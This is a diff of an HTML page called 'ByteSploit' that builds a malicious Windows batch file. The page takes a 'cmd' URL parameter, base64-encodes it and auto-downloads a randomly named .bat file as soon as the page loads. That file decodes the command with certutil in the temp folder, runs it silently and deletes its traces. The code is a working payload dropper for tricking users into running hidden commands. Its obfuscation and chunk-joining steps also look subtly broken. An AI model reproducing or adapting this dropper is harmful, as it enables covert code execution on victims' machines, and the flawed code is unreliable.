@@ -1,62 +1,49 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html>
-	<title>ByteSploit</title> 
-	<script src="https://unpkg.com/javascript-obfuscator/dist/index.browser.js"></script> <!-- Include js-obfuscator library -->
-	<script> 
-		function  createBatchFile ( )  { 
-			// Get arguments from form input or URL 
-			var  urlParams  =  new  URLSearchParams ( window . location . search ) ; 
-			var  urlcmd  =  urlParams . get ( 'cmd' ) ; 
-			if  ( urlcmd  !==  null )  { 
-				cmd  =  btoa(urlcmd) ; // Encode the cmd variable in base64
-			} 
-			// Create batch file content 
-			var  content  =  '@echo off\r\n' ; 
-			content += 'setlocal enabledelayedexpansion\r\n';
-			content += 'set base64_string=' + cmd + '\r\n';
-			content += 'set "temp_file=%temp%\\temp.bat"\r\n';
-			content += 'echo %base64_string% > %temp_file%\r\n';
-			content += 'certutil -decode %temp_file% %temp%\\decoded.bat >nul\r\n';
-			content += 'del %temp_file%\r\n';
-			content += 'call %temp%\\decoded.bat >nul\r\n';
-			content += 'del %temp%\\decoded.bat >nul\r\n'; // Add line to delete decoded.bat file
-			content += 'cls\r\n'; // Add line to clear screen
-			content += 'exit\r\n'; // Add line to exit command prompt
-			
-			// Obfuscate batch file content using js-obfuscator
-			var obfuscationResult = JavaScriptObfuscator.obfuscate(content, {
-			  compact: true,
-			  controlFlowFlattening: true,
-			  controlFlowFlatteningThreshold: 1,
-			  numbersToExpressions: true,
-			  simplify: true,
-			  shuffleStringArray: true,
-			  splitStrings: true,
-			  stringArrayThreshold: 1
-			});
-			content = obfuscationResult.getObfuscatedCode();
-			
-			// Create Blob object 
-			var  blob  =  new  Blob ( [ content ] ,  { type :  'text/plain' } ) ;
-			
-			// Generate random filename 
-			var  filename  =  Math . random ( ) . toString ( 36 ) . substring ( 2 )  +  '.bat' ;
-			
-			// Generate download URL and set it as the href of a link 
-			var  link  =  document . createElement ( 'a' ) ; 
-			link . download  =  filename ; 
-			link . href  =  URL . createObjectURL ( blob ) ; 
-			link . click ( ) ;
+	<title>ByteSploit</title>
+	<script>
+		function createBatchFile() {
+			// Get arguments from form input or URL
+			var urlParams = new URLSearchParams(window.location.search);
+			var urlcmd = urlParams.get('cmd');
+			if (urlcmd !== null) {
+				cmd = btoa(urlcmd); // Encode the cmd variable in base64
+			}
+			// Create batch file content
+			var content = "@echo off\r\n";
+			content += "setlocal enabledelayedexpansion\r\n";
+			content += "set base64_string=";
+			content += cmd.match(/.{1,50}/g).join("^&") + "\r\n";
+			content += "set \"temp_file=%temp%\\temp.bat\"\r\n";
+			content += "echo %base64_string% > %temp_file%\r\n";
+			content += "certutil -decode %temp_file% %temp%\\decoded.bat >nul\r\n";
+			content += "del %temp_file%\r\n";
+			content += "call %temp%\\decoded.bat >nul\r\n";
+			content += "del %temp%\\decoded.bat >nul\r\n"; // Add line to delete decoded.bat file
+			content += "cls\r\n"; // Add line to clear screen
+			content += "exit\r\n"; // Add line to exit command prompt
+
+			// Create Blob object
+			var blob = new Blob([content], { type: 'text/plain' });
+
+			// Generate random filename
+			var filename = Math.random().toString(36).substring(2) + '.bat';
+
+			// Generate download URL and set it as the href of a link
+			var link = document.createElement('a');
+			link.download = filename;
+			link.href = URL.createObjectURL(blob);
+			link.click();
 		}
-		
-		// Set default value of cmd from URL and create batch file 
-		var  urlParams  =  new  URLSearchParams ( window . location . search ) ; 
-		var  urlcmd  =  urlParams . get ( 'cmd' ) ; 
-		if  ( urlcmd  !==  null )  { 
-			var  cmd  =  btoa(urlcmd) ; // Encode the cmd variable in base64
-			createBatchFile ( ) ; 
-		} 
+
+		// Set default value of cmd from URL and create batch file
+		var urlParams = new URLSearchParams(window.location.search);
+		var urlcmd = urlParams.get('cmd');
+		if (urlcmd !== null) {
+			var cmd = btoa(urlcmd); // Encode the cmd variable in base64
+			createBatchFile();
+		}
 	</script>
-<body> 
-</body> 
+	<body>
+	</body>
 </html>
